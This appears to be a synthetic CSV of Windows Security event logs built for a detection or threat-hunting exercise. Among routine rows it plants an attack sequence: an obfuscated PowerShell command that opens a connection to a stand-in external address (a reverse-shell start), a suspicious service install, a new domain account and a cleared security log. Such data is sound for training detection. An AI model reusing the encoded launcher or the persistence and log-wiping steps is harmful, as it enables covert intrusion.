TimeGenerated,Computer,EventID,Activity,Account,AccountType,AccountDomain,AccountName,TargetUserName,TargetDomainName,IpAddress,IpPort,LogonType,LogonProcessName,FailureReason,ProcessName,NewProcessName,ParentProcessName,CommandLine,ServiceName,ServiceFileName,EventSourceName,Channel,Type
2026-04-29T03:19:34Z,WS-HR-03,4688,,CORP\dchen,User,CORP,dchen,dchen,CORP,,,,,,,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T04:50:47Z,WS-DEV-02,4688,,CORP\mholmes,User,CORP,mholmes,mholmes,CORP,,,,,,,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\notepad.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T08:34:16Z,SVR-DC-01,4688,,CORP\jadams,User,CORP,jadams,jadams,CORP,,,,,,,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\cmd.exe /c dir,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T20:05:32Z,WS-HR-03,4688,,CORP\jadams,User,CORP,jadams,jadams,CORP,,,,,,,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\notepad.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T01:43:50Z,WS-DEV-02,4688,,CORP\mholmes,User,CORP,mholmes,mholmes,CORP,,,,,,,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k netsvcs,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T13:04:05Z,WS-HR-03,4688,,CORP\dchen,User,CORP,dchen,dchen,CORP,,,,,,,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\notepad.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T21:03:00Z,WS-FINANCE-01,4688,,CORP\mholmes,User,CORP,mholmes,mholmes,CORP,,,,,,,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\notepad.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T11:00:43Z,SVR-WEB-01,4688,,CORP\jadams,User,CORP,jadams,jadams,CORP,,,,,,,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k netsvcs,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T19:04:57Z,WS-DEV-02,4688,,CORP\dchen,User,CORP,dchen,dchen,CORP,,,,,,,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T13:14:31Z,WS-FINANCE-01,4688,,CORP\jadams,User,CORP,jadams,jadams,CORP,,,,,,,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\notepad.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T10:10:48Z,WS-FINANCE-01,4688,,CORP\bryce,User,CORP,bryce,bryce,CORP,,,,,,,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k netsvcs,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T17:56:20Z,WS-FINANCE-01,4688,,CORP\mholmes,User,CORP,mholmes,mholmes,CORP,,,,,,,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\cmd.exe /c dir,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T06:42:56Z,SVR-DC-01,4688,,CORP\bryce,User,CORP,bryce,bryce,CORP,,,,,,,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T17:08:49Z,WS-DEV-02,4688,,CORP\mholmes,User,CORP,mholmes,mholmes,CORP,,,,,,,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k netsvcs,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T11:27:36Z,WS-FINANCE-01,4688,,CORP\dchen,User,CORP,dchen,dchen,CORP,,,,,,,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T22:26:22Z,WS-HR-03,4688,,CORP\dchen,User,CORP,dchen,dchen,CORP,,,,,,,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\cmd.exe /c dir,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T05:55:07Z,WS-FINANCE-01,4688,,CORP\bryce,User,CORP,bryce,bryce,CORP,,,,,,,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\notepad.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T01:35:03Z,SVR-DC-01,4688,,CORP\mholmes,User,CORP,mholmes,mholmes,CORP,,,,,,,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k netsvcs,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T16:35:52Z,WS-HR-03,4688,,CORP\dchen,User,CORP,dchen,dchen,CORP,,,,,,,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\cmd.exe /c dir,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T21:25:43Z,WS-FINANCE-01,4688,,CORP\mholmes,User,CORP,mholmes,mholmes,CORP,,,,,,,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\cmd.exe /c dir,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T04:43:43Z,WS-HR-03,4688,,CORP\jadams,User,CORP,jadams,jadams,CORP,,,,,,,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T06:15:59Z,SVR-DC-01,4688,,CORP\jadams,User,CORP,jadams,jadams,CORP,,,,,,,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\notepad.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T13:15:12Z,WS-HR-03,4688,,CORP\dchen,User,CORP,dchen,dchen,CORP,,,,,,,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\cmd.exe /c dir,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T18:09:14Z,SVR-WEB-01,4688,,CORP\jadams,User,CORP,jadams,jadams,CORP,,,,,,,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\notepad.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T20:37:09Z,SVR-DC-01,4688,,CORP\mholmes,User,CORP,mholmes,mholmes,CORP,,,,,,,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T18:26:40Z,WS-FINANCE-01,4688,,CORP\mholmes,User,CORP,mholmes,mholmes,CORP,,,,,,,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\cmd.exe /c dir,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T17:02:20Z,SVR-WEB-01,4688,,CORP\jadams,User,CORP,jadams,jadams,CORP,,,,,,,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\cmd.exe /c dir,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T06:41:08Z,SVR-DC-01,4688,,CORP\jadams,User,CORP,jadams,jadams,CORP,,,,,,,C:\Windows\System32\cmd.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\cmd.exe /c dir,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T01:36:00Z,WS-DEV-02,4688,,CORP\jadams,User,CORP,jadams,jadams,CORP,,,,,,,C:\Windows\System32\chrome.exe,C:\Windows\System32\explorer.exe,C:\Program Files\Google\Chrome\Application\chrome.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-28T17:13:13Z,WS-FINANCE-01,4688,,CORP\bryce,User,CORP,bryce,bryce,CORP,,,,,,,C:\Windows\System32\notepad.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\notepad.exe,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T12:17:36Z,SVR-WEB-01,4688,,CORP\mholmes,User,CORP,mholmes,mholmes,CORP,,,,,,,C:\Windows\System32\svchost.exe,C:\Windows\System32\services.exe,C:\Windows\System32\svchost.exe -k netsvcs,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T13:30:00Z,WS-DEV-02,4688,,CORP\dchen,User,CORP,dchen,dchen,CORP,,,,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\explorer.exe,powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADgALgA1ADEALgAxADAAMAAuADUANQAiACwANAA0ADMAKQA=,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T13:15:00Z,SVR-DC-01,4697,,CORP\bryce,User,CORP,bryce,bryce,CORP,,,,,,,,,,UpdateSvc,C:\ProgramData\Microsoft\update_svc.exe,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T13:20:00Z,SVR-DC-01,4720,,CORP\bryce,User,CORP,bryce,contractor01,CORP,,,,,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-29T13:40:00Z,WS-HR-03,1102,,CORP\jadams,User,CORP,jadams,,,,,,,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T13:54:36Z,WS-MKT-01,4634,,CORP\mwhite,User,CORP,mwhite,mwhite,CORP,,,3,Negotiate,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T14:04:25Z,SVR-DC-01,4720,,CORP\jharris,User,CORP,jharris,newuser132,CORP,,,,,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T14:13:51Z,WS-IT-02,4688,,CORP\lwoods,User,CORP,lwoods,lwoods,CORP,,,,,,C:\Windows\System32\OUTLOOK.EXE,C:\Windows\System32\OUTLOOK.EXE,C:\Windows\System32\csrss.exe,"""C:\Windows\System32\OUTLOOK.EXE""",,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T14:26:54Z,WS-OPS-02,4624,,CORP\rmorales,User,CORP,rmorales,rmorales,CORP,10.86.11.248,53734,10,Kerberos,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T14:32:10Z,WS-OPS-01,4624,,CORP\jharris,User,CORP,jharris,jharris,CORP,192.168.205.30,61803,11,Kerberos,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T14:33:06Z,WS-MKT-02,4688,,CORP\sthompson,User,CORP,sthompson,sthompson,CORP,,,,,,C:\Windows\System32\WINWORD.EXE,C:\Windows\System32\WINWORD.EXE,C:\Windows\System32\WINWORD.EXE,"""C:\Windows\System32\WINWORD.EXE""",,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T14:47:16Z,SVR-DC-01,4688,,CORP\kpatel,User,CORP,kpatel,kpatel,CORP,,,,,,C:\Windows\System32\taskmgr.exe,C:\Windows\System32\taskmgr.exe,C:\Windows\System32\explorer.exe,"""C:\Windows\System32\taskmgr.exe""",,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T14:54:46Z,WS-OPS-02,4624,,CORP\agarcia,User,CORP,agarcia,agarcia,CORP,172.19.220.47,53468,3,Kerberos,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T14:54:52Z,LAP-EXEC-01,4634,,CORP\dkim,User,CORP,dkim,dkim,CORP,,,5,Kerberos,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T14:57:45Z,WS-OPS-02,4732,,CORP\bsato,User,CORP,bsato,newuser510,CORP,,,,,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T14:58:27Z,WS-FINANCE-01,4634,,CORP\tnguyen,User,CORP,tnguyen,tnguyen,CORP,,,5,User32,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T15:00:44Z,WS-MKT-01,4624,,CORP\tnguyen,User,CORP,tnguyen,tnguyen,CORP,10.192.234.218,59286,3,NtLmSsp,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T15:11:26Z,WS-IT-01,4688,,CORP\sthompson,User,CORP,sthompson,sthompson,CORP,,,,,,C:\Windows\System32\OUTLOOK.EXE,C:\Windows\System32\OUTLOOK.EXE,C:\Windows\System32\WINWORD.EXE,"""C:\Windows\System32\OUTLOOK.EXE""",,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T15:14:16Z,LAP-EXEC-01,4624,,CORP\kpatel,User,CORP,kpatel,kpatel,CORP,172.24.211.204,62780,5,User32,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T15:15:25Z,WS-IT-02,4625,,CORP\sthompson,User,CORP,sthompson,sthompson,CORP,10.99.186.165,58782,2,NtLmSsp,Unknown user name or bad password.,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T15:15:51Z,WS-HR-03,4624,,CORP\rmorales,User,CORP,rmorales,rmorales,CORP,192.168.15.62,65125,5,NtLmSsp,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T15:33:34Z,WS-IT-01,4688,,CORP\jharris,User,CORP,jharris,jharris,CORP,,,,,,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,C:\Windows\System32\csrss.exe,"""C:\Windows\System32\services.exe""",,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T15:41:38Z,LAP-EXEC-01,4624,,CORP\jharris,User,CORP,jharris,jharris,CORP,172.29.247.49,60877,5,Kerberos,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T15:45:22Z,SVR-DC-01,4624,,CORP\mwhite,User,CORP,mwhite,mwhite,CORP,10.13.201.33,52890,3,Kerberos,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T15:45:47Z,WS-MKT-01,4624,,CORP\ehernandez,User,CORP,ehernandez,ehernandez,CORP,172.23.149.210,53597,4,Kerberos,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T15:46:39Z,SVR-WEB-01,4624,,CORP\rmorales,User,CORP,rmorales,rmorales,CORP,10.127.203.183,62241,3,NtLmSsp,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T15:47:35Z,WS-FINANCE-01,4625,,CORP\jharris,User,CORP,jharris,jharris,CORP,172.28.0.234,57453,5,NtLmSsp,Unknown user name or bad password.,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T15:50:29Z,LAP-SALES-03,4688,,CORP\dkim,User,CORP,dkim,dkim,CORP,,,,,,C:\Windows\System32\csrss.exe,C:\Windows\System32\csrss.exe,C:\Windows\System32\csrss.exe,"""C:\Windows\System32\csrss.exe""",,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T15:59:16Z,WS-DEV-02,4624,,CORP\mwhite,User,CORP,mwhite,mwhite,CORP,10.36.235.96,58810,3,Kerberos,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T16:00:31Z,LAP-EXEC-01,4624,,CORP\lwoods,User,CORP,lwoods,lwoods,CORP,10.17.84.120,65000,2,NtLmSsp,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T16:01:49Z,WS-DEV-02,4688,,CORP\rmorales,User,CORP,rmorales,rmorales,CORP,,,,,,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,"""C:\Windows\System32\services.exe""",,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T16:05:15Z,WS-IT-02,4688,,CORP\dkim,User,CORP,dkim,dkim,CORP,,,,,,C:\Windows\System32\OUTLOOK.EXE,C:\Windows\System32\OUTLOOK.EXE,C:\Windows\System32\firefox.exe,"""C:\Windows\System32\OUTLOOK.EXE""",,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T16:08:48Z,WS-IT-01,4688,,CORP\olopez,User,CORP,olopez,olopez,CORP,,,,,,C:\Windows\System32\wininit.exe,C:\Windows\System32\wininit.exe,C:\Windows\System32\smss.exe,"""C:\Windows\System32\wininit.exe""",,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T16:09:06Z,WS-IT-02,4624,,CORP\agarcia,User,CORP,agarcia,agarcia,CORP,172.17.62.7,51977,5,NtLmSsp,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T16:23:58Z,WS-DEV-02,4634,,CORP\mwhite,User,CORP,mwhite,mwhite,CORP,,,3,Kerberos,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T16:26:13Z,WS-MKT-01,4688,,CORP\rmorales,User,CORP,rmorales,rmorales,CORP,,,,,,C:\Windows\System32\csrss.exe,C:\Windows\System32\csrss.exe,C:\Windows\System32\code.exe,"""C:\Windows\System32\csrss.exe""",,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T16:33:11Z,WS-OPS-01,4697,,CORP\jharris,User,CORP,jharris,jharris,CORP,,,,,,,,,,svc-ee9c2ca8,C:\Program Files\svc-ee9c2ca8\svc-ee9c2ca8.exe,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T16:51:07Z,WS-OPS-01,4720,,CORP\lwoods,User,CORP,lwoods,newuser309,CORP,,,,,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T16:56:58Z,WS-MKT-02,4624,,CORP\kpatel,User,CORP,kpatel,kpatel,CORP,10.112.44.183,56810,5,Advapi,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T16:58:39Z,LAP-SALES-03,4672,,CORP\jharris,Admin,CORP,jharris,jharris,CORP,,,,,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T17:02:04Z,LAP-EXEC-01,4688,,CORP\rmorales,User,CORP,rmorales,rmorales,CORP,,,,,,C:\Windows\System32\SearchHost.exe,C:\Windows\System32\SearchHost.exe,C:\Windows\System32\wininit.exe,"""C:\Windows\System32\SearchHost.exe""",,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T17:08:13Z,SVR-WEB-01,4688,,CORP\agarcia,User,CORP,agarcia,agarcia,CORP,,,,,,C:\Windows\System32\msiexec.exe,C:\Windows\System32\msiexec.exe,C:\Windows\System32\svchost.exe,"""C:\Windows\System32\msiexec.exe""",,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T17:08:21Z,WS-FINANCE-01,4625,,CORP\agarcia,User,CORP,agarcia,agarcia,CORP,10.159.168.215,60562,5,Kerberos,Unknown user name or bad password.,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T17:12:54Z,WS-IT-02,4697,,CORP\dkim,User,CORP,dkim,dkim,CORP,,,,,,,,,,svc-d7b1e180,C:\Program Files\svc-d7b1e180\svc-d7b1e180.exe,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T17:19:48Z,LAP-EXEC-01,4688,,CORP\lwoods,User,CORP,lwoods,lwoods,CORP,,,,,,C:\Windows\System32\OUTLOOK.EXE,C:\Windows\System32\OUTLOOK.EXE,C:\Windows\System32\lsass.exe,"""C:\Windows\System32\OUTLOOK.EXE""",,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T17:21:31Z,WS-DEV-02,4688,,CORP\tnguyen,User,CORP,tnguyen,tnguyen,CORP,,,,,,C:\Windows\System32\explorer.exe,C:\Windows\System32\explorer.exe,C:\Windows\System32\csrss.exe,"""C:\Windows\System32\explorer.exe""",,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T17:26:28Z,WS-FINANCE-01,4624,,CORP\rmorales,User,CORP,rmorales,rmorales,CORP,10.79.175.162,60175,3,Negotiate,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T17:47:33Z,WS-IT-02,4624,,CORP\rmorales,User,CORP,rmorales,rmorales,CORP,10.69.215.68,51024,7,Kerberos,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T17:47:53Z,WS-IT-02,4624,,CORP\rmorales,User,CORP,rmorales,rmorales,CORP,10.216.145.93,65382,5,Kerberos,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T17:49:16Z,WS-FINANCE-01,4634,,CORP\agarcia,User,CORP,agarcia,agarcia,CORP,,,3,Kerberos,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T17:49:23Z,WS-HR-03,4624,,CORP\rmorales,User,CORP,rmorales,rmorales,CORP,10.3.83.218,58336,7,NtLmSsp,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T17:52:09Z,WS-MKT-01,4624,,CORP\tnguyen,User,CORP,tnguyen,tnguyen,CORP,10.77.115.84,65476,2,NtLmSsp,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T17:53:42Z,WS-MKT-01,4688,,CORP\bsato,User,CORP,bsato,bsato,CORP,,,,,,C:\Windows\System32\code.exe,C:\Windows\System32\code.exe,C:\Windows\System32\csrss.exe,"""C:\Windows\System32\code.exe""",,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T17:53:58Z,WS-OPS-01,4624,,CORP\rmorales,User,CORP,rmorales,rmorales,CORP,10.236.20.163,60755,5,Negotiate,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T17:57:18Z,LAP-EXEC-01,4624,,CORP\bsato,User,CORP,bsato,bsato,CORP,10.55.139.227,53910,11,NtLmSsp,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T17:58:13Z,WS-FINANCE-01,4625,,CORP\ehernandez,User,CORP,ehernandez,ehernandez,CORP,10.68.66.154,61025,2,Negotiate,Unknown user name or bad password.,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T18:10:24Z,WS-MKT-01,4624,,CORP\agarcia,User,CORP,agarcia,agarcia,CORP,10.173.20.81,51854,3,Negotiate,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T18:17:53Z,WS-DEV-02,4688,,CORP\jharris,User,CORP,jharris,jharris,CORP,,,,,,C:\Windows\System32\csrss.exe,C:\Windows\System32\csrss.exe,C:\Windows\System32\smss.exe,"""C:\Windows\System32\csrss.exe""",,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T18:21:01Z,WS-MKT-01,4624,,CORP\tnguyen,User,CORP,tnguyen,tnguyen,CORP,10.14.111.148,53776,2,NtLmSsp,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T18:23:42Z,WS-MKT-01,4634,,CORP\bsato,User,CORP,bsato,bsato,CORP,,,3,NtLmSsp,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T18:26:04Z,WS-OPS-02,4688,,CORP\jharris,User,CORP,jharris,jharris,CORP,,,,,,C:\Windows\System32\SearchHost.exe,C:\Windows\System32\SearchHost.exe,C:\Windows\System32\svchost.exe,"""C:\Windows\System32\SearchHost.exe""",,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T18:26:50Z,SVR-DC-01,4624,,CORP\tnguyen,User,CORP,tnguyen,tnguyen,CORP,10.118.146.32,53320,2,NtLmSsp,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T18:28:37Z,WS-OPS-02,4697,,CORP\rmorales,User,CORP,rmorales,rmorales,CORP,,,,,,,,,,svc-4986bd2b,C:\Program Files\svc-4986bd2b\svc-4986bd2b.exe,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T18:33:17Z,WS-HR-03,4688,,CORP\olopez,User,CORP,olopez,olopez,CORP,,,,,,C:\Windows\System32\msiexec.exe,C:\Windows\System32\msiexec.exe,C:\Windows\System32\chrome.exe,"""C:\Windows\System32\msiexec.exe""",,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T18:33:49Z,WS-MKT-01,4624,,CORP\mwhite,User,CORP,mwhite,mwhite,CORP,172.30.21.196,63932,3,Kerberos,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T18:36:06Z,WS-IT-01,4625,,CORP\lwoods,User,CORP,lwoods,lwoods,CORP,10.12.233.245,49618,3,Kerberos,Unknown user name or bad password.,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T18:36:56Z,WS-MKT-01,4672,,CORP\sthompson,Admin,CORP,sthompson,sthompson,CORP,,,,,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T18:49:30Z,SVR-DC-01,4624,,CORP\rmorales,User,CORP,rmorales,rmorales,CORP,10.247.155.35,52826,3,Kerberos,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T18:50:42Z,SVR-DC-01,4634,,CORP\tnguyen,User,CORP,tnguyen,tnguyen,CORP,,,3,Kerberos,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T18:57:06Z,LAP-EXEC-01,4634,,CORP\agarcia,User,CORP,agarcia,agarcia,CORP,,,2,NtLmSsp,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T19:00:34Z,WS-MKT-01,4634,,CORP\agarcia,User,CORP,agarcia,agarcia,CORP,,,11,Negotiate,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
2026-04-15T19:01:11Z,SVR-WEB-01,4624,,CORP\kpatel,User,CORP,kpatel,kpatel,CORP,10.54.5.190,63349,3,NtLmSsp,,,,,,,,Microsoft-Windows-Security-Auditing,Security,SecurityEvent
